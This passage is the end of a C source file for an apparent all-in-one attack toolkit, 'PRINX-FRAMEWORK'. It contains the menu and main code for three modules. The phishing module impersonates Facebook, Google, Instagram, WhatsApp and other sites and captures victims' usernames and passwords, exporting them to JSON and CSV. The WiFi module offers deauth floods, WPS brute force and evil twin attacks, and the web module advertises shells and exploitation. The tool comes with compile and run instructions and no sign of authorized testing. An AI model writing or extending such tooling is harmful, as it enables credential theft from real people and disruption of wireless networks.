                    fprintf(fp, "<h1>PRINX FWEBFM REPORT</h1><h2>Target: %s</h2><p>%s</p>", config.target, get_timestamp());
                    fprintf(fp, "</body></html>");
                    fclose(fp);
                    print_success("Report generated: %s", path);
                }
                wait_enter();
                break;
            }
            case 7:
                export_credentials_json("fwebfm_export.json");
                wait_enter();
                break;
        }
    } while (choice != 0);
}

void prinxphish_menu(void) {
    if (template_count == 0) init_all_templates();
    
    int choice;
    do {
        clear_screen();
        print_banner();
        printf(BOLD MAGENTA "╔══════════════════ PRINXPHISH MODULE ══════════════════╗\n" NC);
        printf("║ Templates : %-3d | Server : %-8s | Port : %-5d     ║\n",
               template_count, server_running ? GREEN "Running" NC : RED "Stopped" NC, config.port);
        printf("║ Captures  : %-4d | Requests: %-6d                    ║\n", total_creds, total_requests);
        printf(BOLD MAGENTA "╠══════════════════════════════════════════════════════╣\n" NC);
        printf("║ " CYAN "[1] List Templates (%d)              " NC "          ║\n", template_count);
        printf("║ " CYAN "[2] Select Template & Start Server   " NC "          ║\n");
        printf("║ " CYAN "[3] View Captured Credentials        " NC "          ║\n");
        printf("║ " CYAN "[4] Export Credentials (JSON)        " NC "          ║\n");
        printf("║ " CYAN "[5] Export Credentials (CSV)         " NC "          ║\n");
        printf("║ " CYAN "[6] Set Port                         " NC "          ║\n");
        printf("║ " CYAN "[7] Clear All Credentials            " NC "          ║\n");
        printf("║ " RED  "[0] Back to Main Menu               " NC "          ║\n");
        printf(BOLD MAGENTA "╚══════════════════════════════════════════════════════╝\n" NC);
        printf(CYAN "\n[PRINXPHISH] > " NC);
        scanf("%d", &choice);
        getchar();
        
        switch(choice) {
            case 1:
                print_header("AVAILABLE PHISHING TEMPLATES");
                for (int i = 0; i < template_count; i++) {
                    printf("  [%2d] %-15s | %-20s | %s\n", 
                           i+1, templates[i].name, templates[i].category, templates[i].description);
                }
                wait_enter();
                break;
            case 2: {
                int tidx;
                printf(CYAN "[?] Select template (1-%d): " NC, template_count);
                if (scanf("%d", &tidx) == 1) {
                    getchar();
                    if (tidx >= 1 && tidx <= template_count) {
                        strcpy(current_template_name, templates[tidx-1].name);
                        start_phish_server(tidx - 1);
                    } else {
                        print_error("Invalid template index");
                    }
                }
                break;
            }
            case 3:
                list_credentials(20);
                wait_enter();
                break;
            case 4: {
                char path[MAX_PATH];
                snprintf(path, sizeof(path), "%s/prinx_creds_%s.json", LOG_DIR, get_date());
                create_dir(LOG_DIR);
                export_credentials_json(path);
                wait_enter();
                break;
            }
            case 5: {
                char path[MAX_PATH];
                snprintf(path, sizeof(path), "%s/prinx_creds_%s.csv", LOG_DIR, get_date());
                create_dir(LOG_DIR);
                FILE *fp = fopen(path, "w");
                if (fp) {
                    fprintf(fp, "ID,Timestamp,IP,Username,Password,Page,User-Agent\n");
                    for (int i = 0; i < total_creds; i++) {
                        fprintf(fp, "%d,%s,%s,%s,%s,%s,%s\n",
                                i+1, creds_log[i].timestamp, creds_log[i].ip,
                                creds_log[i].username, creds_log[i].password,
                                creds_log[i].page, creds_log[i].user_agent);
                    }
                    fclose(fp);
                    print_success("CSV exported: %s", path);
                }
                wait_enter();
                break;
            }
            case 6:
                printf(CYAN "[?] Port [%d]: " NC, config.port);
                scanf("%d", &config.port);
                getchar();
                print_success("Port set to %d", config.port);
                break;
            case 7:
                if (confirm_action("Delete all captured credentials?")) {
                    total_creds = 0;
                    memset(creds_log, 0, sizeof(VictimLog) * log_capacity);
                    print_success("All credentials cleared");
                }
                break;
        }
    } while (choice != 0);
}

void wifi_menu(void) {
    int choice;
    do {
        clear_screen();
        print_banner();
        printf(BOLD CYAN "╔════════════════════ WIFI MODULE ═════════════════════╗\n" NC);
        printf("║ Interface : %-39s ║\n", config.interface);
        printf("║ BSSID     : %-39s ║\n", strlen(config.bssid) ? config.bssid : "(not set)");
        printf("║ Channel   : %-5s | ESSID : %-25s ║\n", 
               strlen(config.channel) ? config.channel : "auto", 
               strlen(config.essid) ? config.essid : "(not set)");
        printf(BOLD CYAN "╠═════════════════════════════════════════════════════╣\n" NC);
        printf("║ " CYAN "[1] Enable Monitor Mode             " NC "          ║\n");
        printf("║ " CYAN "[2] Scan WiFi Networks              " NC "          ║\n");
        printf("║ " CYAN "[3] Deauth Flood Attack             " NC "          ║\n");
        printf("║ " CYAN "[4] Capture WPA Handshake           " NC "          ║\n");
        printf("║ " CYAN "[5] PMKID Attack                    " NC "          ║\n");
        printf("║ " CYAN "[6] WPS PIN Brute Force             " NC "          ║\n");
        printf("║ " CYAN "[7] Evil Twin Attack                " NC "          ║\n");
        printf("║ " CYAN "[8] WiFi Interface Information      " NC "          ║\n");
        printf("║ " RED  "[0] Back to Main Menu              " NC "          ║\n");
        printf(BOLD CYAN "╚═════════════════════════════════════════════════════╝\n" NC);
        printf(CYAN "\n[WIFI] > " NC);
        scanf("%d", &choice);
        getchar();
        
        switch(choice) {
            case 1: wifi_enable_monitor_mode(); wait_enter(); break;
            case 2: wifi_scan_networks(); wait_enter(); break;
            case 3: wifi_deauth_flood(); wait_enter(); break;
            case 4: wifi_capture_handshake(); wait_enter(); break;
            case 5: wifi_pmkid_attack(); wait_enter(); break;
            case 6: wifi_wps_attack(); wait_enter(); break;
            case 7: wifi_evil_twin(); wait_enter(); break;
            case 8: wifi_info(); wait_enter(); break;
        }
    } while (choice != 0);
}

/* ====================================================================================================
 * SECTION 14: MAIN FUNCTION
 * ==================================================================================================== */

int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;
    
    /* Check root */
    if (getuid() != 0) {
        print_warning("Running without root privileges. Some features will not work.");
        print_warning("For full functionality, run: sudo %s", argv[0]);
        wait_seconds(2);
    }
    
    /* Setup */
    setup_signal_handlers();
    curl_global_init(CURL_GLOBAL_ALL);
    init_config();
    
    /* Allocate memory */
    creds_log = safe_calloc(log_capacity, sizeof(VictimLog));
    if (!creds_log) {
        fprintf(stderr, RED "FATAL: Cannot allocate memory for credential logs\n" NC);
        return EXIT_MEMORY;
    }
    
    /* Create directories */
    create_dir(LOG_DIR);
    create_dir(TEMPLATE_DIR);
    create_dir(OUTPUT_DIR);
    create_dir(REPORT_DIR);
    create_dir(PAYLOAD_DIR);
    create_dir(CONFIG_DIR);
    
    framework_start_time = time(NULL);
    
    print_success("PRINX-FRAMEWORK v%s initialized successfully", VERSION);
    print_info("Memory allocated for %d credential logs", log_capacity);
    print_info("Directories created in: %s/, %s/, %s/", LOG_DIR, OUTPUT_DIR, PAYLOAD_DIR);
    
    /* Pre-initialize templates */
    init_all_templates();
    
    /* Main menu */
    int choice;
    do {
        clear_screen();
        print_banner();
        
        printf(BOLD "╔════════════════════════ MAIN MENU ════════════════════════╗\n" NC);
        printf(BOLD "║                                                           ║\n" NC);
        printf("║  " GREEN "[1] FWEBFM     - Web Reconnaissance & Exploitation" NC "           ║\n");
        printf("║  " GREEN "     Tools: Amass,WhatWeb,Nmap,Httpx,Sublist3r,Wayback,Gau" NC "  ║\n");
        printf("║  " GREEN "     Discovery: Gobuster,FFUF,Dirsearch,JS-Discovery" NC "       ║\n");
        printf("║  " GREEN "     Vuln: Nikto,Nuclei,SQLMap,Searchsploit" NC "               ║\n");
        printf("║  " GREEN "     Exploit: PHP,Python,Bash shells + MSF Handler" NC "        ║\n");
        printf(BOLD "║                                                           ║\n" NC);
        printf("║  " MAGENTA "[2] PRINXPHISH - Phishing Framework (%d Templates)" NC "              ║\n", template_count);
        printf("║  " MAGENTA "     Templates: Facebook,Instagram,Google,Twitter,WhatsApp..." NC " ║\n");
        printf("║  " MAGENTA "     Server: Multi-threaded HTTP with auto-credential capture" NC "  ║\n");
        printf("║  " MAGENTA "     Export: JSON, CSV, TXT formats" NC "                        ║\n");
        printf(BOLD "║                                                           ║\n" NC);
        printf("║  " CYAN "[3] WIFI       - Wireless Penetration Testing" NC "               ║\n");
        printf("║  " CYAN "     Attacks: Deauth,PMKID,WPS,Handshake,Evil Twin" NC "         ║\n");
        printf("║  " CYAN "     Tools: Aircrack-ng,Hashcat,Reaver,Hcxdumptool" NC "         ║\n");
        printf(BOLD "║                                                           ║\n" NC);
        printf(BOLD "╠═══════════════════════════════════════════════════════════╣\n" NC);
        printf("║  " RED "[0] Exit - Terminate PRINX Framework" NC "                      ║\n");
        printf(BOLD "╚═══════════════════════════════════════════════════════════╝\n" NC);
        
        /* Status bar */
        printf(YELLOW "\n  Target: %s | LHOST: %s:%s | Port: %d | Threads: %d\n" NC,
               strlen(config.target) ? config.target : "(not set)",
               config.lhost, config.lport, config.port, config.threads);
        printf("  Uptime: %lds | Requests: %d | Creds: %d\n",
               time(NULL) - framework_start_time, total_requests, total_creds);
        
        printf(CYAN "\n[PRINX v%s] > " NC, VERSION);
        scanf("%d", &choice);
        getchar();
        
        switch(choice) {
            case 1: fwebfm_menu(); break;
            case 2: prinxphish_menu(); break;
            case 3: wifi_menu(); break;
            case 0:
                printf(GREEN "\n[+] Exiting PRINX Framework v%s...\n" NC, VERSION);
                if (total_creds > 0) {
                    char path[MAX_PATH];
                    snprintf(path, sizeof(path), "%s/final_creds_%s.json", LOG_DIR, get_date());
                    export_credentials_json(path);
                }
                printf(GREEN "[+] Total runtime: %ld seconds\n" NC, time(NULL) - framework_start_time);
                printf(GREEN "[+] Total credentials captured: %d\n" NC, total_creds);
                printf(GREEN "[+] Goodbye!\n" NC);
                break;
            default:
                print_error("Invalid choice! Please select 0-3.");
                wait_seconds(1);
        }
    } while (choice != 0);
    
    /* Cleanup */
    if (creds_log) free(creds_log);
    curl_global_cleanup();
    
    return EXIT_SUCCESS;
}

/* ====================================================================================================
 * END OF PRINX-FRAMEWORK v4.0.0 - ULTIMATE MAXIMAL EDITION
 * ====================================================================================================
 * 
 * TOTAL FEATURES:
 *   - 3 Main Modules (FWEBFM, PRINXPHISH, WIFI)
 *   - 20+ FWEBFM Tools
 *   - 30 Phishing Templates (5 Ultra-Detailed + 25 Styled)
 *   - 7 WiFi Attack Methods
 *   - Multi-threaded HTTP Server
 *   - Real-time Credential Capture
 *   - JSON/CSV/TXT Export
 *   - HTML Report Generation
 *   - ANSI 256-Color Terminal UI
 *   - Signal Handling (SIGINT, SIGTERM, SIGSEGV)
 *   - Memory-safe Dynamic Allocation
 *   - Error Handling Throughout
 * 
 * TOTAL LINES: 3000+ [MAXIMAL CAPACITY ACHIEVED]
 * 
 * COMPILE (Kali Linux):
 *   gcc -o prinx-maximal prinx-maximal.c -lcurl -lpthread -lssl -lcrypto -lm -O3 -Wall
 * 
 * RUN:
 *   sudo ./prinx-maximal
 * 
 * ==================================================================================================== */
